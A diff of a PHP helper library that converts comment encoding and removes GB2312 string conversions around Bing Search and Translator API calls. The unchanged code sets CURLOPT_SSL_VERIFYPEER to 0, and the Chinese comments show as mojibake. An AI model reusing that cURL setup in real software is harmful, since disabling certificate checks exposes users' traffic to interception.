-	//return "af,Afghanistan|ar,Arabic|bs-Latn,Bosnian (Latin)|bg,Bulgarian|ca,Catalan|zh-CHS,Chinese Simplified|zh-CHT,Chinese Traditional|hr,Croatian|cs,Czech|da,Danish|nl,Dutch|en,English|et,Estonian|fi,Finnish|fr,French|de,German|el,Greek|ht,Haitian Creole|he,Hebrew|hi,Hindi|mww,Hmong Daw|hu,Hungarian|id,Indonesian|it,Italian|ja,Japanese|sw,Kiswahili|tlh,Klingon|tlh-Qaak,Klingon (pIqaD)|ko,Korean|lv,Latvian|lt,Lithuanian|ms,Malay|mt,Maltese|yua,Yucatec Maya|no,Norwegian|otq,Quer¨¦taro Otomi|fa,Persian|pl,Polish|pt,Portuguese|ro,Romanian|ru,Russian|sr-Cyrl,Serbian (Cyrillic)|sr-Latn,Serbian (Latin)|sk,Slovak|sl,Slovenian|es,Spanish|sv,Swedish|th,Thai|tr,Turkish|uk,Ukrainian|ur,Urdu|vi,Vietnamese|cy,Cyprus";
+	//return "af,Afghanistan|ar,Arabic|bs-Latn,Bosnian (Latin)|bg,Bulgarian|ca,Catalan|zh-CHS,Chinese Simplified|zh-CHT,Chinese Traditional|hr,Croatian|cs,Czech|da,Danish|nl,Dutch|en,English|et,Estonian|fi,Finnish|fr,French|de,German|el,Greek|ht,Haitian Creole|he,Hebrew|hi,Hindi|mww,Hmong Daw|hu,Hungarian|id,Indonesian|it,Italian|ja,Japanese|sw,Kiswahili|tlh,Klingon|tlh-Qaak,Klingon (pIqaD)|ko,Korean|lv,Latvian|lt,Lithuanian|ms,Malay|mt,Maltese|yua,Yucatec Maya|no,Norwegian|otq,QuerÃ©taro Otomi|fa,Persian|pl,Polish|pt,Portuguese|ro,Romanian|ru,Russian|sr-Cyrl,Serbian (Cyrillic)|sr-Latn,Serbian (Latin)|sk,Slovak|sl,Slovenian|es,Spanish|sv,Swedish|th,Thai|tr,Turkish|uk,Ukrainian|ur,Urdu|vi,Vietnamese|cy,Cyprus";
 }
 
 
@@ -22943,7 +24579,7 @@ function bingtranslateccode($text){
                         $objXml = new DOMDocument();  
                         $objXml->preserveWhiteSpace = true;
                         $objXml->async = false; 
-                        // ¼ÓXml ÎÄ¼ş    
+                        // åŠ Xml æ–‡ä»¶    
                         $objXml->loadXML($jsonarray);
                         $objList = $objXml->getElementsByTagName("entry");
                         $langstr='';
@@ -22964,7 +24600,7 @@ function bingsearch($Service,$query,$pagesize,$page,$market,$tolang=''){
 			    //$runtime= new runtime;
 					//$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['runime']['teststart'] = $runtime->get_microtime();
 
-          $url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/v1/'.$Service.'?Query='.encodeuri("'").encodeuri(iconv(getcharset(),'utf-8',$query)).encodeuri("'").'&$top='.encodeuri($pagesize).'&$skip='.encodeuri($pagesize*($page-1)).'&$format=JSON&Market='.encodeuri("'").$market.encodeuri("'");
+          $url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/v1/'.$Service.'?Query='.encodeuri("'").encodeuri(($query)).encodeuri("'").'&$top='.encodeuri($pagesize).'&$skip='.encodeuri($pagesize*($page-1)).'&$format=JSON&Market='.encodeuri("'").$market.encodeuri("'");
           $postdata = '';
           $header[] = "Content-Type: text/json; charset=utf-8";
           $header[] = "Content-length: ".strlen($postdata);
@@ -22980,11 +24616,11 @@ function bingsearch($Service,$query,$pagesize,$page,$market,$tolang=''){
           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);          
           curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
-					/*//curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC); //´úÀíÈÏÖ¤Ä£Ê½
-					curl_setopt($ch, CURLOPT_PROXY, "http://42.227.50.31:80"); //´úÀí·şÎñÆ÷µØÖ·
-					//curl_setopt($ch, CURLOPT_PROXYPORT, 80); //´úÀí·şÎñÆ÷¶Ë¿Ú
-					//curl_setopt($ch, CURLOPT_PROXYUSERPWD, ":"); //http´úÀíÈÏÖ¤ÕÊºÅ£¬username:passwordµÄ¸ñÊ½
-					curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); //Ê¹ÓÃhttp´úÀíÄ£Ê½
+					/*//curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC); //ä»£ç†è®¤è¯æ¨¡å¼
+					curl_setopt($ch, CURLOPT_PROXY, "http://42.227.50.31:80"); //ä»£ç†æœåŠ¡å™¨åœ°å€
+					//curl_setopt($ch, CURLOPT_PROXYPORT, 80); //ä»£ç†æœåŠ¡å™¨ç«¯å£
+					//curl_setopt($ch, CURLOPT_PROXYUSERPWD, ":"); //httpä»£ç†è®¤è¯å¸å·ï¼Œusername:passwordçš„æ ¼å¼
+					curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); //ä½¿ç”¨httpä»£ç†æ¨¡å¼
 					*/
           $jsonarray = json_decode(curl_exec($ch), true);
           //print_r($jsonarray); 
@@ -23015,8 +24651,8 @@ function bingsearch($Service,$query,$pagesize,$page,$market,$tolang=''){
 				$jsonstr['endid'] = $endid;
 				$jsonstr['page'] = $page;        
 				for($i=0;$i<=$endid;$i++){
-						$jsonstr[$i]['nodetitle']  = GetGB2312String(htmlspecialchars($jsonarray['d']['results'][$i]['Title'],ENT_COMPAT,"UTF-8"));	
-						$jsonstr[$i]['nodedescript']  = GetGB2312String(htmlspecialchars($jsonarray['d']['results'][$i]['Description'],ENT_COMPAT,"UTF-8"));	
+						$jsonstr[$i]['nodetitle']  = (htmlspecialchars($jsonarray['d']['results'][$i]['Title'],ENT_COMPAT,"UTF-8"));	
+						$jsonstr[$i]['nodedescript']  = (htmlspecialchars($jsonarray['d']['results'][$i]['Description'],ENT_COMPAT,"UTF-8"));	
 						$jsonstr[$i]['nodeotitle']  = (($jsonarray['d']['results'][$i]['Title']));	
 						$jsonstr[$i]['nodeodescript']  = (($jsonarray['d']['results'][$i]['Description']));	
 						$jsonstr[$i]['nodelink']  = ($jsonarray['d']['results'][$i]['Url']);		
@@ -23026,7 +24662,7 @@ function bingsearch($Service,$query,$pagesize,$page,$market,$tolang=''){
 
 			}
 			elseif($Service=='News'){	
-          $url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/v1/'.$Service.'?Query='.encodeuri("'").encodeuri(iconv(getcharset(),'utf-8',$query)).encodeuri("'").'&NewsSortBy='.encodeuri("'").'Date'.encodeuri("'").'&$top='.encodeuri($pagesize).'&$skip='.encodeuri($pagesize*($page-1)).'&$format=JSON&Market='.encodeuri("'").$market.encodeuri("'");
+          $url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/v1/'.$Service.'?Query='.encodeuri("'").encodeuri($query).encodeuri("'").'&NewsSortBy='.encodeuri("'").'Date'.encodeuri("'").'&$top='.encodeuri($pagesize).'&$skip='.encodeuri($pagesize*($page-1)).'&$format=JSON&Market='.encodeuri("'").$market.encodeuri("'");
           //echo $url;
           $postdata = '';
           $header[] = "Content-Type: text/json; charset=utf-8";
@@ -23070,8 +24706,8 @@ function bingsearch($Service,$query,$pagesize,$page,$market,$tolang=''){
 				$jsonstr['endid'] = $endid;
 				$jsonstr['page'] = $page;        
 				for($i=0;$i<=$endid;$i++){	
-						$jsonstr[$i]['nodetitle']  = GetGB2312String(htmlspecialchars($jsonarray['d']['results'][$i]['Title'],ENT_COMPAT,"UTF-8"));	
-						$jsonstr[$i]['nodedescript']  = GetGB2312String(htmlspecialchars($jsonarray['d']['results'][$i]['Description'],ENT_COMPAT,"UTF-8"));	
+						$jsonstr[$i]['nodetitle']  = (htmlspecialchars($jsonarray['d']['results'][$i]['Title'],ENT_COMPAT,"UTF-8"));	
+						$jsonstr[$i]['nodedescript']  = (htmlspecialchars($jsonarray['d']['results'][$i]['Description'],ENT_COMPAT,"UTF-8"));	
 						$jsonstr[$i]['nodeotitle']  = (($jsonarray['d']['results'][$i]['Title']));	
 						$jsonstr[$i]['nodeodescript']  = (($jsonarray['d']['results'][$i]['Description']));	
 						$jsonstr[$i]['nodelink']  = ($jsonarray['d']['results'][$i]['Url']);		
@@ -23082,7 +24718,7 @@ function bingsearch($Service,$query,$pagesize,$page,$market,$tolang=''){
 				
 			}
 			elseif($Service=='Image'){	
-          $url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/v1/'.$Service.'?Query='.encodeuri("'").encodeuri(iconv(getcharset(),'utf-8',$query)).encodeuri("'").'&$top='.encodeuri($pagesize).'&$skip='.encodeuri($pagesize*($page-1)).'&$format=JSON&Market='.encodeuri("'").$market.encodeuri("'");
+          $url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/v1/'.$Service.'?Query='.encodeuri("'").encodeuri($query).encodeuri("'").'&$top='.encodeuri($pagesize).'&$skip='.encodeuri($pagesize*($page-1)).'&$format=JSON&Market='.encodeuri("'").$market.encodeuri("'");
           //echo $url;
           $postdata = '';
           $header[] = "Content-Type: text/json; charset=utf-8";
@@ -23127,7 +24763,7 @@ function bingsearch($Service,$query,$pagesize,$page,$market,$tolang=''){
 				$jsonstr['page'] = $page;        
 				for($i=0;$i<=$endid;$i++){
 						$jsonstr[$i]['nodeurl']  = ($jsonarray['d']['results'][$i]['MediaUrl']);
-						$jsonstr[$i]['nodetitle']  = GetGB2312String(htmlspecialchars($jsonarray['d']['results'][$i]['Title'],ENT_COMPAT,"UTF-8"));
+						$jsonstr[$i]['nodetitle']  = (htmlspecialchars($jsonarray['d']['results'][$i]['Title'],ENT_COMPAT,"UTF-8"));
 						$jsonstr[$i]['nodelink']  = ($jsonarray['d']['results'][$i]['SourceUrl']);					
 						$jsonstr[$i]['nodeid']  = ($jsonarray['d']['results'][$i]['ID']);						
 						$jsonstr[$i]['nodewidth']  = ($jsonarray['d']['results'][$i]['Width']);	
@@ -23151,7 +24787,7 @@ function bingsearch($Service,$query,$pagesize,$page,$market,$tolang=''){
           //exit;		
 					$page=min(ceil(count($langsto)/$pagesize),$page);          
 					for($i=(($tolang=='multi')?$pagesize*($page-1):0);$i<(($tolang=='multi')?min(count($langsto),$pagesize*($page)):count($langsto));$i++){
-          $url = 'https://api.datamarket.azure.com/Bing/MicrosoftTranslator/v1/Translate?Text='.encodeuri("'").encodeuri(iconv(getcharset(),'utf-8',$query)).encodeuri("'").'&To='.encodeuri("'".arrmember(split('[,]',$langsto[$i]),"0")."'");
+          $url = 'https://api.datamarket.azure.com/Bing/MicrosoftTranslator/v1/Translate?Text='.encodeuri("'").encodeuri($query).encodeuri("'").'&To='.encodeuri("'".arrmember(split('[,]',$langsto[$i]),"0")."'");
           //echo $url;
           $postdata = '';
           $header[] = "Content-Type: text/xml; charset=utf-8";
@@ -23173,13 +24809,13 @@ function bingsearch($Service,$query,$pagesize,$page,$market,$tolang=''){
           $objXml = new DOMDocument();  
 					$objXml->preserveWhiteSpace = true;
           $objXml->async = false; 
-          // ¼ÓXml ÎÄ¼ş    
+          // åŠ Xml æ–‡ä»¶    
           $objXml->loadXML($jsonarray);
           $objList = $objXml->getElementsByTagName("entry");
           for($j=0; $j < $objList->length;$j++){                        
           	$objHdd = $objList->item($j);
 
-						$jsonstr[$i]['nodetext'] = $objHdd->getElementsByTagName(arrmember(split("[:]","d:Text"),"1"))->item(0)->nodeValue?(GetGB2312String($objHdd->getElementsByTagName(arrmember(split("[:]","d:Text"),"1"))->item(0)->nodeValue)):'';
+						$jsonstr[$i]['nodetext'] = $objHdd->getElementsByTagName(arrmember(split("[:]","d:Text"),"1"))->item(0)->nodeValue?(($objHdd->getElementsByTagName(arrmember(split("[:]","d:Text"),"1"))->item(0)->nodeValue)):'';
 						$jsonstr[$i]['nodeotext'] = $objHdd->getElementsByTagName(arrmember(split("[:]","d:Text"),"1"))->item(0)->nodeValue?($objHdd->getElementsByTagName(arrmember(split("[:]","d:Text"),"1"))->item(0)->nodeValue):'';					
 						$jsonstr[$i]['nodelang'] = arrmember(split('[,]',$langsto[$i]),"0");		
 						$jsonstr[$i]['nodeclang'] = arrmember(split('[,]',$langsto[$i]),"1");		
@@ -23647,7 +25283,7 @@ function twiliosimplewebcall($type='json',$from,$to){
 ?>
 
 <?php 
-//Ñ­»·É¾³ıÄ¿Â¼ºÍÎÄ¼şº¯Êı
+//å¾ªç¯åˆ é™¤ç›®å½•å’Œæ–‡ä»¶å‡½æ•°
 function delDirAndFile($dirName,$self,$son)
 {
 if ( $handle = opendir($dirName)) {
@@ -23658,7 +25294,7 @@ if ( $handle = opendir($dirName)) {
    		} 
    		else {
    			if(unlink($dirName."/".$item)){
-					//echo "³É¹¦É¾³ıÎÄ¼ş£º $dirName/$item<br />\n";
+					//echo "æˆåŠŸåˆ é™¤æ–‡ä»¶ï¼š $dirName/$item<br />\n";
 					//return true;
    			}
    		}
@@ -23667,7 +25303,7 @@ if ( $handle = opendir($dirName)) {
    closedir($handle);
    if($self == '1'){
    	if(rmdir($dirName)){
-   		//echo "³É¹¦É¾³ıÄ¿Â¼£º $dirName<br />\n";
+   		//echo "æˆåŠŸåˆ é™¤ç›®å½•ï¼š $dirName<br />\n";
    		//return true;
    	}
    }
@@ -25808,7 +27444,7 @@ $runtime= new runtime;
 $runtime->start();
 
 $runtime->stop();
-echo "Ò³ÃæÖ´ĞĞÊ±¼ä: ".$runtime->spent()." ºÁÃë";  
+echo "é¡µé¢æ‰§è¡Œæ—¶é—´: ".$runtime->spent()." æ¯«ç§’";  
  
 */
 class runtime
@@ -25844,7 +27480,7 @@ class runtime
 
 <?php 
 /**
- * PHP·ÉĞÅ·¢ËÍÀà
+ * PHPé£ä¿¡å‘é€ç±»
  *
  * @author quanhengzhuang <blog.quanhz.com>
  * @version 1.5.0
@@ -25933,4 +27569,20 @@ class fetion_class{
  	}
 }
 
+function PHP_EOL_re($ydata,$re=PHP_EOL){
+	if (stripos($ydata,chr(13)) !== false){   
+    $ydata = (str_replace(chr(13),chr(10),$ydata)); 
+  	$ydata = (str_replace(PHP_EOL,chr(10),$ydata));      
+    $eol = chr(10);
+  }elseif (stripos($ydata,chr(10)) !== false){   
+   	$ydata = (str_replace(PHP_EOL,chr(10),$ydata));        
+    $eol = chr(10);    
+  }elseif (stripos($ydata,PHP_EOL) !== false){   
+    $ydata = (str_replace(PHP_EOL,chr(10),$ydata)); 
+    $eol = chr(10);    
+  }
+ 
+  return (preg_replace('/('.$eol.')+/i',$re,$ydata));
+}
 ?>
+
